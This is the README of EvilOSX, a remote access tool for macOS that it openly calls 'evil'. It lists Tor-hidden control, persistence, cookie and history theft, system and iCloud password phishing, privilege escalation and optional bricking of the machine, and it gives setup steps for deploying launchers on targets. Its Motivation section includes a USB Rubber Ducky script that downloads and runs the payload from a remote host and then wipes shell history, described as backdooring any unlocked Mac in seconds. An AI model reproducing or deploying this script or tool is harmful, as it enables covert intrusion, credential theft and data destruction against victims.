<h1 align="center">
  <br>
  <a href="https://github.com/Marten4n6/EvilOSX"><img src="https://i.imgur.com/rFz6SCe.png" alt="Logo" width="280"></a>
  <br>
  EvilOSX
  <br>
</h1>

<h4 align="center">An evil RAT (Remote Access Tool) for macOS / OS X.</h4>

<p align="center">
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg?style=flat-square" alt="License">
  </a>
  <a href="https://www.python.org">
      <img src="https://img.shields.io/badge/python-2.7,%203.7-blue.svg?style=flat-square" alt="Python">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/issues">
    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg?style=flat-square" alt="Issues">
  </a>
  <a href="https://travis-ci.org/Marten4n6/EvilOSX">
      <img src="https://img.shields.io/travis/Marten4n6/EvilOSX/master.svg?style=flat-square" alt="Build Status">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md">
      <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square" alt="Contributing">
  </a>
</p>

---

## Features

- **Anonymous** communications via [Tor](https://www.torproject.org/about/overview.html#thesolution) onion services
- **Encrypted** launchers using OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
- **No client dependencies**
  - Python comes pre-installed on macOS / OSX
- **Persistent** across system reboots
- **Extendable** [command](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md) system:
  - Take desktop screenshots
  - Retrieve Firefox cookies
  - Monitor the clipboard
  - Attempt to get root via local privilege escalation
  - Download and upload files
  - Retrieve browser history (Chrome and Safari)
  - Phish for the system password
  - Phish for iCloud passwords via iTunes
  - Enumerate iTunes backups
  - Update to the latest EvilOSX version
  - Remove EvilOSX (optionally bricking the system)
  - Retrieve iCloud tokens
    - Retrieve iCloud contacts
    - Retrieve Find My iPhone devices

## How To Use

[Click here to **download**](https://github.com/Marten4n6/EvilOSX/releases/latest) the latest stable version of EvilOSX.

### From Source

```bash
# Clone or download this repository
$ git clone https://github.com/Marten4n6/EvilOSX

# Go into the repository
$ cd EvilOSX

# Install dependencies required by the server
$ sudo pip install -r requirements.txt

# Start the server
$ python start.py

# Lastly, run a built launcher on your target(s)
```

## Screenshots

![UI](https://i.imgur.com/7EKGLbB.png)

## Motivation

This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
```
REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
REM See also: https://ducktoolkit.com/vidpid/

DELAY 1000
GUI SPACE
DELAY 500
STRING Termina
DELAY 1000
ENTER
DELAY 1500

REM Kill all terminals after x seconds
STRING screen -dm bash -c 'sleep 6; killall Terminal'
ENTER

STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
ENTER
```
- It takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
- Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise
- To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/) <br/>
- Aluminum Keyboard (ISO) is probably the one you are looking for

## Versioning

EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
Server and bot releases will be numbered with the follow format:
```
<major>.<minor>.<patch>
```

And constructed with the following guidelines:
- Breaking backward compatibility (with older bots) bumps the major
- New additions without breaking backward compatibility bumps the minor
- Bug fixes and misc changes bump the patch

For more information on SemVer, please visit https://semver.org/.

## Contributing

For a guide on how to create commands, click [here](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md).

## Issues

Feel free to submit any issues or feature requests [here](https://github.com/Marten4n6/EvilOSX/issues).

## References

- The awesome [Empire](https://github.com/EmpireProject) project
- Shout out to [Patrick Wardle](https://twitter.com/patrickwardle) for his awesome talks, check out [Objective-See](https://objective-see.com/)
- [Hiding In Plain Sight - Advances In Malware Covert Communication Channels](https://youtu.be/3o4sVGmf4Dk)
- [TinyTor](https://github.com/Marten4n6/TinyTor)
- Logo created by [motusora](https://www.behance.net/motusora)

## License

[GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
